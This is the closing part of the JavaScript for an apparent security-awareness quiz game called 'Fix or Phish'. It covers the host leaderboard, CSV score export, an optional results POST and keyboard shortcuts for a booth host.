  if (!all.length) return;
  const cell = v => `"${String(v).replace(/"/g, '""')}"`;
  const rows = [["Rank", "Name", "Score", "Fully correct", "Out of", "Would have run it", "Played at"]]
    .concat(all.map((e, i) => [i + 1, e.name, e.score, e.correct, e.total, e.pwned, new Date(e.at).toLocaleString()]));
  const csv = "\uFEFF" + rows.map(r => r.map(cell).join(",")).join("\r\n");
  const url = URL.createObjectURL(new Blob([csv], { type: "text/csv;charset=utf-8;" }));
  const a = document.createElement("a");
  a.href = url;
  a.download = `fix-or-phish-scores-${new Date().toISOString().slice(0, 10)}.csv`;
  a.click();
  URL.revokeObjectURL(url);
}

function renderBoard(fromNav){
  clearTimer();
  const all = loadScores().sort((a, b) => b.score - a.score || a.pwned - b.pwned);
  const top = all.slice(0, 15);
  const played = all.length;
  const gotHit = all.filter(x => x.pwned > 0).length;

  stage.innerHTML = `
    <p class="eyebrow">${esc(CONFIG.orgName)} &#183; ${esc(CONFIG.eventName)}</p>
    <h2>Host view &#8212; scores</h2>
    <p class="tiny">Players never see this screen. Saved in this browser only, and nothing is sent anywhere &#8212; export before you clear.</p>
    ${played ? `
      <div class="grade">Winner: ${esc(all[0].name)} &#183; ${all[0].score} pts</div>
      <div class="statrow">
        <div class="stat"><b>${played}</b><span>Games played</span></div>
        <div class="stat danger"><b>${gotHit}</b><span>Would have run it</span></div>
        <div class="stat"><b>${Math.round(all.reduce((s,x) => s + x.score, 0) / played)}</b><span>Average score</span></div>
      </div>
      <table>
        <thead><tr><th>#</th><th>Name</th><th class="n">Correct</th><th class="n">Ran it</th><th class="n">Score</th></tr></thead>
        <tbody>${top.map((e, i) => `
          <tr class="${lastEntry && e.at === lastEntry.at ? "me" : ""}">
            <td class="n">${i + 1}</td><td>${esc(e.name)}</td>
            <td class="n">${e.correct}/${e.total}</td>
            <td class="n">${e.pwned}</td><td class="n">${e.score}</td>
          </tr>`).join("")}</tbody>
      </table>`
    : `<p class="empty">No scores yet. Be the first.</p>`}
    <div class="foot">
      <button class="big" id="back">${fromNav ? "Play" : "Next player"}</button>
      ${played ? `<button class="big alt" id="csv">Download for Excel</button>` : ""}
      ${played ? `<button class="big alt" id="clear">Clear scores</button>` : ""}
    </div>`;

  document.getElementById("back").onclick = () => { player = null; renderStart(); };
  document.getElementById("csv")?.addEventListener("click", downloadCsv);
  document.getElementById("clear")?.addEventListener("click", () => {
    if (confirm("Clear all scores from this browser? This cannot be undone.")){
      localStorage.removeItem(LB_KEY); lastEntry = null; renderBoard(fromNav);
    }
  });
}

/* Fire-and-forget POST. Never blocks the player, never surfaces errors. */
function postResult(data){
  if (!CONFIG.resultsEndpoint) return;
  try {
    fetch(CONFIG.resultsEndpoint, {
      method:"POST", mode:"no-cors",
      headers:{ "Content-Type":"text/plain;charset=utf-8" },
      body: JSON.stringify(data)
    }).catch(() => {});
  } catch { /* ignore */ }
}

/* Keyboard shortcuts so a booth host can drive it without a mouse. */
document.addEventListener("keydown", e => {
  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "h"){
    e.preventDefault();
    hostUnlocked = true;
    refreshHostNav();
    renderBoard(true);
    return;
  }
  if (e.target.tagName === "INPUT") return;
  const map = { "1":"safe", "2":"verify", "3":"attack" };
  if (map[e.key]) stage.querySelector(`.ans[data-k="${map[e.key]}"]`)?.click();
  if (e.key === "Enter" || e.key === " ") document.getElementById("nx")?.click();
});

renderStart();
</script>
</body>
</html>
